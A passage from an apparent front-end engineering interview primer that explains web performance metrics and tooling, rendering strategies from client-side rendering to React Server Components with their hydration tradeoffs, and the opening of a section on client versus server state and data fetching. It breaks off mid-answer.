
### Q11. What's in the Navigation Timing and Resource Timing APIs, and when would you use them?

Both are `PerformanceObserver`/`performance.getEntries()` data sources that expose the browser's own timing breakdowns.

**Navigation Timing** (`type: 'navigation'`) — one entry for the page load, with timestamps for every phase: DNS lookup, TCP connect, TLS, request/response (→ **TTFB**), DOM parsing, `DOMContentLoaded`, and `load`. Use it to compute TTFB and see where the *document* load spends time.

```javascript
const nav = performance.getEntriesByType('navigation')[0];
const ttfb = nav.responseStart - nav.requestStart;      // server + network
const domReady = nav.domContentLoadedEventEnd;
```

**Resource Timing** (`type: 'resource'`) — one entry *per fetched asset* (images, scripts, CSS, XHR/fetch), with the same phase breakdown plus `transferSize`/`encodedBodySize`. Use it to find slow or oversized resources, spot render-blocking assets, detect uncompressed responses, and build a request waterfall programmatically.

```javascript
performance.getEntriesByType('resource')
  .filter(r => r.duration > 500)            // slow assets
  .forEach(r => console.log(r.name, r.duration, r.transferSize));
```

You'd use these to build **custom RUM** — e.g. reporting real-user TTFB, third-party script cost, or the load time of your API calls — beyond what the CWV library gives you. Note cross-origin resources need the `Timing-Allow-Origin` header to expose detailed timings.

### Q12. How do you use the DevTools Performance panel to find a bottleneck?

Record a trace while reproducing the problem, then read it top-down:

1. **Throttle first** — set CPU to 4x/6x slowdown and network to Slow 4G so the trace reflects real users, not your fast machine.
2. **Record** the interaction or load, then stop.
3. **Read the main thread flame chart** — wide bars are expensive. Look for **long tasks** (flagged with a red triangle / "Long task" and a striped corner). Yellow = scripting, purple = rendering/layout, green = painting.
4. **Look for forced reflows** — purple "Layout" bars mid-script, often labelled "Forced reflow is a likely performance bottleneck" (Runtime topic).
5. **Check the Experience/Layout Shift track** for CLS culprits, and the LCP marker for the largest paint.
6. **Use the Summary/Bottom-Up/Call Tree** tabs to see where total time goes by function.

Modern Chrome also has the **Performance Insights** / Core Web Vitals overlay that surfaces LCP, CLS, and INP directly with the offending element. The goal of the panel isn't a score — it's to point you at the *specific* function, asset, or reflow that's costing the most, so you fix the dominant cost instead of guessing.

### Q13. TTFB vs FCP vs LCP — what's the difference and how do they relate?

Three points on the same loading timeline, each later than the last:

```text
navigation → [ TTFB ] first byte → [ FCP ] first pixel of content → [ LCP ] largest element painted → load
             server+network         first paint                       main content
```

- **TTFB (Time to First Byte)** — how long until the *first byte* of the HTML response arrives. Pure server + network (DNS, connect, TLS, server think time). Everything downstream waits on it, so it's the floor under FCP and LCP.
- **FCP (First Contentful Paint)** — when the *first* content (any text, image, SVG) paints. Tells you the browser has started rendering something. Good ≤ 1.8s.
- **LCP (Largest Contentful Paint)** — when the *largest* content element paints — the thing the user came to see. A Core Web Vital, good ≤ 2.5s.

They relate causally: a bad TTFB makes FCP and LCP bad no matter what you do on the client, so fix the server/CDN first. A good TTFB and FCP but bad LCP means the *big* element (hero image, main heading) is slow — preload/optimize it. FCP much earlier than LCP can mean a fast skeleton but slow real content. Reading the gaps between them tells you *which layer* to fix.

### Q14. Someone says "just add `useMemo` / lazy-load everything to make it faster." What's wrong with that?

It's **optimizing without measuring** — the cardinal sin. The advice assumes it knows the bottleneck; usually it doesn't, and it adds cost:

- **`useMemo`/memoization isn't free** — it costs a comparison every render plus retained memory. If the memoized work was cheap, you've made the code slower *and* harder to read. Memoize where a profiler shows real, repeated cost — not reflexively.
- **Lazy-loading everything** can *hurt* — lazy-loading above-the-fold images delays LCP; over-splitting the bundle creates request waterfalls and more round trips; lazy-loading the wrong route makes the common path slower.
- **It ignores the actual dominant cost.** If your problem is a 900ms TTFB or a render-blocking third-party script, no amount of `useMemo` helps.

The correct answer: **measure first.** Get field data to see which metric fails, profile with throttling to find the biggest single cost, fix *that*, and re-measure to confirm it moved. "Add X everywhere" is a checklist, not a diagnosis. Senior performance work is targeted: one measured bottleneck, one fix, one verification — repeat.

### Q15. What is a performance budget and how do you enforce it?

A **performance budget** is a hard limit on metrics or resource sizes that you agree not to exceed — e.g. "LCP ≤ 2.5s at p75", "JS bundle ≤ 200KB gzipped", "no more than 50 requests", "CLS ≤ 0.1". It turns performance from a vague aspiration into a **checkable constraint** so regressions get caught before they ship.

Two kinds:

- **Metric budgets** — CWV thresholds (LCP/INP/CLS) and timings (TTFB, FCP).
- **Resource budgets** — total JS/CSS/image bytes, request count, third-party weight.

Enforcement:

- **In CI**, run **Lighthouse CI** with assertions that fail the build if a budget is breached; or use bundle-size tools (`bundlesize`, `size-limit`) to block a PR that bloats the JS.
- **Bundler budgets** — webpack/Vite can warn or error when a chunk exceeds a size.
- **Field monitoring** — dashboards/alerts on RUM p75 so real-user regressions page you even if CI passed.

```text
# Example Lighthouse CI assertion (conceptual)
assert:
  largest-contentful-paint: ["error", { maxNumericValue: 2500 }]
  total-byte-weight:        ["error", { maxNumericValue: 500000 }]
```

The value is **preventing slow creep** — performance degrades one "small" dependency and one un-preloaded image at a time. A budget makes each regression visible and forces a conscious tradeoff (lab CI budget) while field alerts catch what the lab missed.

## Rendering Strategies

### Summary

**What this topic covers**

The single biggest architectural decision in a modern web app is **where and when the HTML gets produced** — on the client at runtime, on the server per request, at build time, or some blend. This topic covers the strategies and their tradeoffs, framework-agnostically: **CSR** (client-side rendering — ship JS, render in the browser), **SSR** (server-side rendering — HTML per request, then **hydration**), **SSG** (static site generation — HTML at build time), **ISR** (incremental static regeneration — static with scheduled revalidation), and the newer **streaming SSR** and **islands / partial hydration**. The 15 questions here train you to reason about the tradeoff curve — first paint vs interactivity vs SEO vs server cost — and to **choose per page**, not per app. The central concept threaded through all of it is **hydration**: the cost of making server-rendered HTML interactive, and the "uncanny valley" where a page *looks* ready but doesn't respond. This topic makes the CSR-vs-SSR debate concrete and measurable, connecting directly to the LCP/INP/TTFB metrics from the Measurement topic. Frameworks (Next, Remix, Astro, SvelteKit) appear only as examples of the general patterns.

**Mental model**

Every strategy answers one question — **"who builds the HTML the user first sees, and when?"** — and every answer trades the same four things: **first paint** (how fast content appears), **interactivity** (how fast it responds), **SEO/robustness** (does content exist without JS), and **server cost/complexity**. CSR pushes *everything* to the client: the server sends a near-empty shell and a JS bundle, the browser builds the DOM. Fast repeat navigation and cheap servers, but a slow, blank first paint and SEO/JS-dependency risk. SSR moves the *first* render to the server: real HTML arrives fast (good FCP/LCP, good SEO), but then the browser must **hydrate** — re-run the JS to attach event listeners — and during that gap the page looks ready but isn't (the uncanny valley, bad INP). SSG does the server render *at build time* and serves static files (fastest + cheapest + robust) but the content is frozen until the next build. ISR is SSG that quietly re-renders on a schedule to stay fresh. The frontier — **streaming** and **islands** — attacks hydration cost by sending HTML in chunks and hydrating only the interactive bits. The senior move is that this is a **per-page** decision.

**Key terms**

- **CSR (Client-Side Rendering)** — server sends a shell + JS; the browser renders the DOM. Fast subsequent nav, slow first paint, SEO/JS cost.
- **SSR (Server-Side Rendering)** — HTML generated on the server *per request*, then hydrated on the client.
- **Hydration** — the client re-runs the component code over the server HTML to attach event listeners and state, making it interactive.
- **SSG (Static Site Generation)** — HTML generated at **build time**; served as static files from a CDN.
- **ISR (Incremental Static Regeneration)** — SSG that revalidates/regenerates pages on a schedule or on-demand after the build.
- **Streaming SSR** — the server flushes HTML in chunks as it's ready (`Transfer-Encoding: chunked`), so the browser paints earlier.
- **Islands / partial hydration** — most of the page is static HTML; only interactive "islands" ship and hydrate JS.
- **Time to Interactive (TTI) gap** — the window where content is visible (post-FCP/LCP) but not yet interactive (pre-hydration).
- **Uncanny valley (of interactivity)** — the page looks fully loaded but clicks/inputs do nothing because hydration hasn't finished.
- **Preload scanner** — the browser's early HTML scan that fetches assets before the main parser reaches them; streaming keeps it fed.
- **RSC (React Server Components)** — components that render on the server and *never* ship their JS to the client; one framework's take on reducing hydration.

**Why interviewers ask this**

Because rendering strategy is where architecture meets performance, and it's a common source of confidently-wrong answers. The junior signal is treating it as a binary religious war ("SSR is always better for SEO") or not knowing what hydration *is*. The senior signal is (1) knowing the tradeoff curve — that SSR helps LCP/SEO but can *hurt* INP because of hydration; (2) choosing **per page** — a marketing page is SSG, a dashboard behind auth is CSR, a product page is SSR/ISR; and (3) understanding the modern frontier — why streaming and islands exist (to cut the hydration tax) and what problem RSC/partial hydration solve. Interviewers also use this to probe whether you connect architecture to *metrics*: "SSR improves LCP but watch INP during hydration" is exactly the lab-vs-field, loading-vs-interactivity reasoning from the Measurement topic. It separates people who pick a framework by default from people who reason about the tradeoff.

**Common confusions**

- "SSR means no JavaScript on the client" — no. SSR sends HTML *and* the JS bundle; the client still downloads and runs it to **hydrate**. You often ship *more* total work than CSR, just in a better order.
- "SSG and SSR are the same because both send HTML" — timing differs completely: SSG renders once at **build**, SSR renders **per request**. SSG can't show per-user or real-time data without client fetching.
- "Hydration is free / instant" — it's often the single biggest cause of poor INP; hydrating a large tree blocks the main thread right when the user starts interacting.
- "CSR is always bad for SEO" — modern crawlers execute JS, but it's slower/less reliable and risky for content you *must* have indexed; SSR/SSG is the safe choice there.
- "Streaming SSR makes hydration faster" — streaming improves *first paint* (TTFB→FCP), not hydration cost by itself; islands/partial hydration and RSC are what cut hydration.
- "One strategy for the whole app" — modern frameworks let you mix per route; that's the point.

**What follows from this topic**

This topic is where the whole primer's performance thread resolves into architecture. The tradeoffs are literally the **Core Web Vitals** from the Measurement topic: SSR/SSG optimize **LCP** and TTFB; hydration cost shows up as poor **INP** (Runtime topic — it's a long task on the main thread); reserving layout during streaming ties back to **CLS**. The hydration discussion connects to the **event loop** (hydration is main-thread work you must schedule/split) and to **data fetching** (server vs client state, request waterfalls). Once you can reason about *where* HTML is produced and *what it costs to make it interactive*, you can make the loading, runtime, and measurement topics add up to a coherent, per-page performance strategy rather than a pile of tips.

### Q1. Explain CSR vs SSR vs SSG vs ISR with a comparison table.

Four answers to "where and when is the HTML produced?":

- **CSR** — server sends an almost-empty HTML shell + a JS bundle; the browser fetches data and renders the DOM at runtime.
- **SSR** — the server renders full HTML **per request**, sends it, then the client hydrates it to interactive.
- **SSG** — the server renders HTML **once at build time**; static files served from a CDN.
- **ISR** — SSG that **re-generates** pages on a schedule (or on-demand) so static content stays fresh.

| | CSR | SSR | SSG | ISR |
|---|---|---|---|---|
| HTML produced | In browser, at runtime | On server, per request | At build time | At build, re-gen on schedule |
| TTFB | Fast (static shell) | Slower (render per req) | Fastest (CDN) | Fastest (CDN) |
| FCP / LCP | Slow (blank until JS) | Fast | Fastest | Fastest |
| Interactivity (INP) | After bundle runs | After hydration | After hydration | After hydration |
| SEO | Weakest (needs JS) | Strong | Strong | Strong |
| Data freshness | Real-time | Per request | Stale until rebuild | Periodically fresh |
| Server cost | Lowest | Highest (per-req compute) | Lowest | Low |
| Best for | Auth'd dashboards, apps | Personalized, dynamic pages | Blogs, docs, marketing | Catalogs, news, mostly-static |

No single winner — you pick per page (Q11). Note SSR and SSG/ISR both still hydrate on the client; the difference is *when the server did its render*.

### Q2. What is hydration and why is it expensive?

**Hydration** is the process where the client-side JS **re-runs the component tree over the already-rendered server HTML** to attach event listeners, wire up state, and make the static markup interactive. The server gave you a photograph of the UI; hydration brings it to life.

It's expensive because the browser has to:

1. **Download** the JS bundle (often as big as, or bigger than, the CSR bundle).
2. **Parse and execute** all that JS on the main thread.
3. **Re-build the component tree** and reconcile it against the existing DOM to attach handlers.

Critically, this is **main-thread work that happens right when the user sees the page and starts interacting** — so it directly hurts **INP**. A large app can spend hundreds of milliseconds hydrating, during which clicks and taps are dropped or queued (the uncanny valley, Q3). You paid to render on the server *and* you pay to hydrate on the client — sometimes more total work than CSR, but arranged so content appears sooner.

This cost is exactly what **partial hydration, islands, streaming, and RSC** (Q7, Q8, Q9) exist to reduce — by hydrating less, or nothing, of the page.

### Q3. What is the "uncanny valley" of hydration, and why is it a UX problem?

It's the window where the page **looks completely loaded but isn't interactive**. SSR delivered real HTML fast (great LCP), so the user sees a finished-looking page — buttons, inputs, menus — and naturally tries to use them. But hydration hasn't finished, so the event listeners aren't attached yet: clicks do nothing, or worse, they're *queued* and fire late in a confusing burst.

```text
timeline:  [ HTML painted ]............[ hydration done ]
user sees:  looks ready! (taps button)    button finally works
result:     dead click / delayed action → feels broken
```

It's worse than a visible spinner because the page gives a **false affordance** — a spinner says "wait", a fully-rendered button says "click me" and then betrays that promise. This is precisely what **INP** captures: the interaction latency during the hydration gap. Mitigations: **stream and hydrate progressively** so interactive parts come alive sooner; use **islands/partial hydration** so critical controls hydrate first; keep bundles small; and defer non-critical hydration. Some frameworks also make server-rendered forms work *before* hydration (progressive enhancement) so the core action isn't dead during the gap.

### Q4. Walk through what the browser does for a CSR page load, step by step.

```text
1. GET /              → server returns a tiny HTML shell:
                         <div id="root"></div><script src="/app.js">
2. Browser parses HTML → sees the empty root, downloads app.js (large bundle)
3. Parse + execute JS  → framework boots on the main thread
4. App renders         → builds the DOM under #root (still no data)
5. Data fetch          → app calls /api/... (often only now, a waterfall)
6. Re-render with data → real content finally appears
7. Interactive         → listeners already attached during render
```

The consequences:

- **Slow FCP/LCP** — the screen is blank (or a skeleton) until steps 3-6 complete. Nothing meaningful paints until JS runs *and* data arrives.
- **Request waterfall risk** — HTML → JS → (parse) → data are often sequential, not parallel.
- **SEO/robustness cost** — with JS disabled or a weak crawler, there's no content.
- **Fast subsequent navigation** — once loaded, client-side routing swaps views without full page reloads, which is CSR's real strength.

CSR is great *after* the first load (SPA feel) but pays for it *at* the first load. That's the exact problem SSR/SSG solve by shipping real HTML in step 1.

### Q5. When is SSR the right choice, and what does it cost you?

**Choose SSR when the page is dynamic/personalized AND needs fast first paint or SEO** — content that changes per request or per user but must still render quickly and be indexable. Examples: a logged-in feed, a personalized product page, search results, anything where SSG can't pre-render because the content depends on the request (cookies, geo, query params, real-time data).

What SSR buys you:

- **Fast FCP/LCP** — real HTML arrives immediately, no blank screen.
- **Strong SEO** — crawlers get full content without executing JS.
- **Per-request freshness** — data is current at render time.

What it costs:

- **Higher TTFB** — the server does work per request (render + data fetch) before the first byte; a slow render or slow upstream data directly raises TTFB, the floor under LCP.
- **Server cost & complexity** — you run compute for every request; you need caching, and code must be **isomorphic** (run on server and client) with no browser-only assumptions (`window`) at module scope.
- **Hydration cost** — you still ship and run the JS to hydrate, so INP is still at risk (Q2).

The senior nuance: SSR improves loading metrics but doesn't fix interactivity — watch INP, and reach for streaming/islands if hydration is heavy.

### Q6. When would you use SSG or ISR instead of SSR?

Use **SSG** when the content is **the same for everyone and changes rarely** — marketing pages, blogs, docs, landing pages, changelogs. You render once at build and serve pure static files from a CDN, which gives you the **best possible TTFB/LCP, lowest cost, and maximum robustness** (no server compute per request, nothing to fall over under load). The tradeoff: content is **frozen until the next build**, and you can't show per-user data server-side (you'd fetch it client-side after load).

Use **ISR** when content is *mostly* static but you don't want a full rebuild every time it changes — a large product catalog, a news site, docs that update through the day. ISR serves the static page but **revalidates it on a schedule** (e.g. "regenerate at most every 60s") or **on-demand** (regenerate when the CMS publishes). You get SSG's speed and cost with bounded staleness.

```text
SSG:  build ──render──> static file ──serve forever (until next build)
ISR:  build ──render──> static file ──serve──> [stale after 60s]
                                      └─ next request triggers background re-render
```

Decision rule: **content identical for all users? → SSG.** Same, but needs to refresh without a redeploy? → **ISR.** Differs per request/user? → **SSR** (Q5). Behind auth and highly interactive with no SEO need? → **CSR**.

### Q7. What is streaming SSR and what problem does it solve?

In classic SSR the server renders the **entire** page (including waiting on all data) before sending a single byte — so a slow database query for one section delays the *whole* page's TTFB. **Streaming SSR** flushes HTML to the browser **in chunks as each part becomes ready** (`Transfer-Encoding: chunked`), so the shell and fast content paint immediately while slow sections stream in behind them.

```text
Non-streaming:  [ wait for ALL data ]────────> send whole page  (late TTFB)
Streaming:      send shell now → send header → [slow section streams in later]
                the browser paints progressively instead of waiting
```

It solves the **"one slow query blocks everything"** problem: the user sees meaningful content sooner (better FCP/LCP), and the browser's **preload scanner** can start fetching assets referenced in the early chunks. Frameworks expose this via boundaries (e.g. React `<Suspense>`) that let a slow subtree stream in with a fallback while the rest renders.

Important nuance: streaming improves **first paint**, not hydration cost by itself. Combined with **selective/progressive hydration**, streamed sections can also hydrate as they arrive rather than all at once — but the core win is getting pixels on screen earlier without waiting for the slowest data.

### Q8. What are islands / partial hydration and why do they exist?

The **islands architecture** treats the page as **mostly static HTML with small interactive "islands"** — a search box, a carousel, an add-to-cart button — and ships/hydrates JS **only for those islands**, leaving everything else as zero-JS static content. It exists to attack the biggest SSR weakness: **hydrating the entire page** when 90% of it (headers, article text, footers) is never interactive.

```text
Traditional SSR:  hydrate the WHOLE tree ──> big bundle, big main-thread cost
Islands:          static HTML everywhere
                  └─[ search island ]  └─[ cart island ]   ← only these ship + hydrate JS
```

Benefits:

- **Far less JS** downloaded and executed → better INP, less main-thread blocking.
- Islands can **hydrate independently and lazily** — on idle, on visibility, or on interaction — so nothing off-screen costs anything up front.
- The static majority is robust and instantly "done" (it was never going to be interactive).

Astro popularized this; the same idea appears as "partial hydration" elsewhere. **React Server Components** (Q9) reach a similar goal differently — server components render to HTML and never ship their JS, while client components are the interactive islands. The unifying insight: **most of a page doesn't need JavaScript, so don't ship or hydrate it.**

### Q9. How do React Server Components change the hydration story?

**React Server Components (RSC)** render **on the server and never send their JavaScript to the client** — only their output (a serialized description that becomes HTML/DOM). They can fetch data directly (async, on the server, close to the database) with no client-side data-fetching round trip. The interactive parts you explicitly mark as **Client Components** (`'use client'`), and *those* are the only things that ship and hydrate JS.

The effect on hydration: instead of hydrating the whole tree (classic SSR), you hydrate **only the client-component islands**, so the JS bundle and main-thread hydration cost shrink to the genuinely-interactive surface.

```text
Server Component (default): runs on server, ships HTML only, 0 client JS
Client Component ('use client'): ships JS, hydrates → interactive
```

Compared to islands frameworks like Astro, RSC does this within a single React tree and adds **server-side data fetching colocated with components** and streaming integration. The tradeoffs: a more complex mental model (which code runs where, the server/client boundary, what's serializable), and you need infrastructure that runs the server render. But the payoff is the same theme as islands and streaming — **ship and hydrate less JS** to fix the INP/hydration tax while keeping SSR's LCP/SEO wins.

### Q10. How do rendering strategies map onto Core Web Vitals?

They're the same tradeoff curve, expressed in metrics from the Measurement topic:

| Strategy | LCP (loading) | INP (interactivity) | CLS | TTFB |
|---|---|---|---|---|
| **CSR** | Poor — blank until JS+data | OK once booted, but blocked during boot | Risk from client-injected content | Good (static shell) |
| **SSR** | Good — real HTML fast | **At risk** — hydration is a long task | Good if space reserved | Higher — per-request render |
| **SSG** | Best — CDN static | At risk during hydration (less JS usually) | Good | Best |
| **ISR** | Best — CDN static | Same as SSG | Good | Best |
| **Islands/RSC** | Good/Best | **Best** — minimal hydration | Good | Good |

The through-lines:

- **LCP** is helped by producing HTML earlier → SSG/ISR/SSR beat CSR.
- **INP** is hurt by hydration → CSR blocks during boot; SSR hydrates a big tree; islands/RSC ship less JS and win.
- **TTFB** favors static (SSG/ISR from CDN) and penalizes per-request SSR.
- **CLS** is orthogonal — mostly about reserving layout space regardless of strategy — but streaming needs care so late chunks don't shift content.

This is why "SSR is faster" is too crude: SSR helps LCP and *risks* INP. The right answer names the metric, which is the senior tell.

### Q11. How do you choose a rendering strategy per page in a real app?

You **don't pick one for the whole app** — modern frameworks let you choose per route, and different pages have different needs. Decide with two questions: **Does the content differ per user/request?** and **Does it need fast first paint / SEO?**

- **Marketing pages, blog, docs, landing** → **SSG** (same for everyone, needs SEO + speed, changes rarely). ISR if it updates without a redeploy.
- **Product/catalog pages** → **ISR or SSR** — need SEO and freshness; ISR if bounded staleness is fine, SSR if truly per-request (pricing, inventory).
- **Personalized but public-facing** (a logged-in home feed that still wants fast paint) → **SSR** with streaming.
- **Dashboards / admin / apps behind auth** → **CSR** — no SEO need, highly interactive, data is per-user and real-time; the SPA nav is the priority.
- **Highly interactive widgets on an otherwise static page** → **islands / partial hydration**.

```text
per-user data?  ─no─> needs SEO/fast paint? ─yes─> SSG (or ISR if it changes)
     │                                        └no─> CSR fine
     └yes─> needs SEO/fast paint? ─yes─> SSR (+ streaming)
                                   └no──> CSR (dashboard/app)
```

State it as a tradeoff tied to metrics ("this page is SSG for LCP + SEO; the checkout is SSR for per-request data; the account dashboard is CSR because it's behind auth and nav-heavy"). That per-page reasoning is exactly what interviewers want.

### Q12. Is CSR really bad for SEO? What are the nuances?

The old answer was "yes, crawlers don't run JS." The modern answer is **"it's riskier and slower, so avoid it for content that must be indexed."**

Nuances:

- **Googlebot does execute JavaScript** — it renders CSR pages in a headless Chromium. So CSR *can* be indexed. But it happens in a **second, deferred pass** (render queue), which can lag, and it consumes crawl budget.
- **Other crawlers and social/link previews** (many smaller search engines, some social scrapers for Open Graph tags) **don't reliably run JS** — so a CSR page can show a blank preview when shared.
- **Reliability & timing** — if your JS errors, is slow, or data fetch fails during the crawler's render, content may be missed. SSR/SSG guarantees the content is in the initial HTML.
- **Meta tags** (title, description, canonical, OG) set by JS may be missed or seen late; server-rendered meta is safe.

Practical stance: **content you depend on for SEO or link previews → SSR/SSG/ISR** so it's in the HTML response. **Content behind auth or that doesn't need indexing → CSR is fine.** A common hybrid is SSR/SSG the public marketing/content pages and CSR the app. Don't rely on crawler JS execution for revenue-critical indexing.

### Q13. What is progressive enhancement and how does it relate to rendering strategies?

**Progressive enhancement** is building so the **core experience works with plain HTML (and minimal/no JS)**, then *enhancing* with JavaScript for richer interactivity. A form submits via a normal HTML `<form action>` and works even before JS loads; once JS arrives, it upgrades to client-side validation and no-reload submission.

It relates directly to the hydration gap (Q3): if your server-rendered form works via native HTML *before* hydration, the "uncanny valley" isn't a broken experience — the button does something even during the dead window. This is the philosophy behind frameworks like Remix (and native form actions elsewhere): SSR the HTML, make it functional without JS, then hydrate to enhance.

```html
<!-- Works before JS (native POST), enhanced after hydration -->
<form method="post" action="/subscribe">
  <input name="email" type="email" required />
  <button>Subscribe</button>
</form>
```

Contrast with the CSR default, where **nothing works without JS** — a JS error or slow bundle means a blank, dead page. Progressive enhancement trades some convenience for **robustness**: the app degrades gracefully instead of failing completely. It pairs naturally with SSR/SSG (real HTML to enhance) and is essentially impossible with pure CSR (no meaningful HTML to start from).

### Q14. Your SSR app has a great LCP but users complain buttons feel laggy. What's happening and how do you fix it?

This is the **classic hydration problem** (Q2, Q3): SSR gave you fast, real HTML (great LCP), but the page isn't interactive until the client **hydrates** — and if the app is large, hydration is a **long main-thread task** running exactly when users start clicking. The symptom is a great loading metric (**LCP**) and a poor interactivity metric (**INP**): the buttons *look* ready but the handlers aren't attached, so early clicks are dropped or delayed.

Diagnose it: record a Performance trace and look for a big scripting long task shortly after paint (the hydration), and check field **INP** — it'll be poor while LCP is fine.

Fixes, roughly in order of leverage:

- **Ship less JS** — code-split, remove heavy dependencies, defer non-critical scripts. Smaller bundle = shorter hydration.
- **Partial / progressive hydration** — hydrate interactive islands first (especially above-the-fold controls), lazy-hydrate the rest on idle/visibility/interaction.
- **Streaming SSR + selective hydration** — let sections hydrate as they stream rather than all at once.
- **Move logic server-side** (RSC-style) so non-interactive components ship no JS to hydrate.
- **Progressive enhancement** — make critical actions (forms) work via native HTML so they aren't dead during the gap.

The framing that lands in an interview: "great LCP, bad INP = a hydration problem — cut or defer the JS you hydrate."

### Q15. Compare the total work done by CSR vs SSR. Does SSR always send less to the client?

**No — SSR often sends *more* total bytes/work, not less.** The win isn't less work; it's **better ordering** of the work so content appears sooner.

- **CSR** sends: a tiny HTML shell + the JS bundle. The client does *all* the rendering. Total payload = shell + JS + (later) data.
- **SSR** sends: the **fully rendered HTML** *plus* the **same JS bundle** (needed to hydrate) *plus* often serialized data to avoid a re-fetch. So SSR frequently ships **more** than CSR — HTML you'll immediately re-derive on the client during hydration.

```text
CSR bytes:  [ shell ] + [ app.js ]                          → render on client
SSR bytes:  [ full HTML ] + [ app.js ] + [ serialized data ] → hydrate on client
```

Why do it then? Because **the user sees meaningful content after the HTML arrives (step 1)** instead of waiting for JS to download, parse, execute, and fetch data (CSR steps 3-6). SSR trades *more total bytes and server compute* for *earlier first paint and SEO*. The costs are the higher TTFB (server render per request) and the hydration tax on INP. This is exactly why islands/RSC (Q8, Q9) are attractive — they keep SSR's early-paint win while **actually** reducing the JS shipped and hydrated, getting closer to "faster *and* less work."
## State & Data Fetching

### Summary

**What this topic covers**

The hardest problem in a modern front end isn't rendering — it's keeping the screen in sync with data that lives somewhere else. This topic is framework-agnostic: the ideas here apply whether you reach for SWR, React Query, RTK Query, Apollo, or a hand-rolled `fetch` wrapper. Three concern areas live here: (1) **where state lives and what kind it is** — the crucial split between **client state** (owned by the UI) and **server state** (a cache of data that truly lives on a server); (2) **the mechanics of fetching well** — caching, revalidation (stale-while-revalidate), request **deduplication**, cancellation with `AbortController`, and avoiding **request waterfalls**; and (3) **the UX contract of async** — loading / error / empty states, **optimistic updates** with rollback, and pagination vs infinite scroll vs cursors. The 16 questions here take you from "what's the difference between local and server state" to "diagnose this fetch waterfall and this stale-cache bug."

**Mental model**

Treat data on the screen as a **cache, not a source of truth**. The real user record lives in a database behind an API; whatever you hold in memory is a possibly-stale copy. Once you internalise that, the whole problem reshapes: you stop asking "how do I store this data" and start asking "how fresh is my copy, when do I refetch, and what do I show while I wait." **Client state** (is the menu open, what's typed in this input, which tab is active) is synchronous, you own it, and it never goes stale. **Server state** is asynchronous, shared with other clients, and goes stale the moment you fetch it — it needs caching, revalidation, and conflict handling. Most junior data bugs come from cramming server state into a general-purpose client store (Redux, a `useState`) and then hand-writing all the caching, loading flags, and refetch logic that a server-state library gives you for free. The second mental shift: **fetches have a shape over time** — request → pending → (success | error), and often → revalidate. Design for every branch, not just the happy path.

**Key terms**

- **Client state** — UI-owned, synchronous, never stale (form inputs, toggles, selected tab).
- **Server state** — a cached copy of remote data; async, shared, goes stale.
- **Stale-while-revalidate (SWR)** — show cached (stale) data instantly, refetch in the background, swap in fresh data when it arrives.
- **Revalidation** — refetching to check the cache is still fresh (on focus, on interval, on mutation).
- **Deduplication** — collapsing multiple identical in-flight requests into one.
- **Optimistic update** — apply the expected result to the UI *before* the server confirms, roll back on failure.
- **Request waterfall** — dependent fetches fired sequentially, each waiting for the last, when they could run in parallel.
- **Cursor pagination** — page via an opaque pointer to the last item, not an offset — stable under inserts/deletes.
- **`AbortController`** — the standard way to cancel an in-flight `fetch`.
- **Cache key** — the identity of a query (usually URL + params); same key ⇒ same cache entry ⇒ dedupe.
- **Empty state** — the distinct "loaded successfully but zero results" case, different from loading and from error.

**Why interviewers ask this**

Data fetching is where junior and senior front-end engineers separate most visibly. A junior wires `fetch` into a `useEffect`, sets a loading boolean, and ships — and then the app has race conditions (stale responses overwriting fresh ones), waterfalls (three spinners stacking), no cancellation, and a mutation that doesn't refresh the list. A senior talks about it as a **caching and synchronisation problem**: which data is server state, what the cache key is, when to revalidate, how to dedupe, how optimistic updates roll back, how to cancel stale requests. Interviewers probe this because it's the difference between an app that *works in the demo* and one that *feels fast and stays correct* under real latency and concurrency. Naming the client-vs-server-state distinction unprompted is a strong senior signal.

**Common confusions**

- "State is state" — no. Client state and server state are different problems with different tools; a global store is the wrong home for server state.
- "`useEffect` + `fetch` is data fetching" — it's the *start* of it; it lacks caching, dedupe, cancellation, and revalidation.
- "Optimistic updates just skip the loading state" — they require a **rollback** path and reconciliation with the server's real response.
- "Infinite scroll is just pagination with no buttons" — same fetch mechanics, but different state management, accessibility, and back-button behaviour.
- "Offset pagination is fine" — it double-shows or skips rows when the underlying list mutates between pages; cursors fix that.
- "Cancelling a fetch stops the server work" — `AbortController` stops *your* client from processing the response; the server may still complete it.

**What follows from this topic**

Data fetching sits on top of everything else in this primer. The network mechanics (HTTP/2 multiplexing, caching headers, `ETag`) are covered in the HTTP and Browser Caching topics and cross-referenced with the Networking primer. `AbortController`, `fetch`, WebSockets, and SSE are detailed in the next topic, Web APIs & Browser Capabilities. Race conditions and "microtask vs macrotask" ordering trace back to the Event Loop topic and the Concurrency primer. And loading/error/empty states are also an accessibility concern — announcing state changes is covered in Accessibility & Semantics.

### Q1. What's the difference between client state and server state, and why does it matter?

**Client state** is owned by the UI: is a dropdown open, what's typed in a search box, which tab is selected, the current theme. It's synchronous, it never "goes stale," and no other user or tab can change it out from under you.

**Server state** is a *cached copy* of data that actually lives on a server: the list of users, the current user's profile, a product's price. It's asynchronous to read, it's **shared** (another client can change it), and it **goes stale** the moment you fetch it.

They matter because they need completely different tooling. Client state wants a simple store (`useState`, a signal, a small Redux slice). Server state wants caching, background revalidation, deduplication, and cancellation — which is exactly what libraries like React Query and SWR provide.

```javascript
// Client state — synchronous, UI-owned
const [isMenuOpen, setMenuOpen] = useState(false);

// Server state — a cache of remote data; needs freshness handling
const { data, isStale } = useQuery('user', () => fetch('/api/user'));
```

The classic anti-pattern is stuffing server state into a general client store and then re-implementing caching, loading flags, and refetch-on-mutation by hand — badly.

### Q2. Explain stale-while-revalidate. Why is it the default caching strategy for UIs?

Stale-while-revalidate (SWR) means: **serve the cached copy immediately, even if it might be stale, and refetch in the background; when fresh data arrives, swap it in.**

The user sees data instantly (no spinner on a warm cache), and correctness catches up a moment later. It trades a brief window of possibly-stale data for a dramatic perceived-performance win.

```text
t0  user opens page  → cache has data  → render stale data NOW
t0  (in background)  → fire refetch
t1  refetch resolves → data changed?   → re-render with fresh data
```

It's the default for UIs because most data tolerates being a few seconds stale, and users hate spinners far more than they hate a value that updates itself half a second later. You tune it with knobs: revalidate on window focus, on reconnect, on an interval, or after a mutation. For data that must never be stale (a bank balance mid-transfer, a checkout total), you opt *out* — force a fresh fetch and block on it.

### Q3. How would you fetch data with `useEffect` + `fetch`, and what's wrong with the naive version?

The naive version:

```javascript
function UserProfile({ id }) {
  const [user, setUser] = useState(null);
  useEffect(() => {
    fetch(`/api/users/${id}`).then(r => r.json()).then(setUser);
  }, [id]);
  // ...
}
```

Problems, roughly in order of severity:

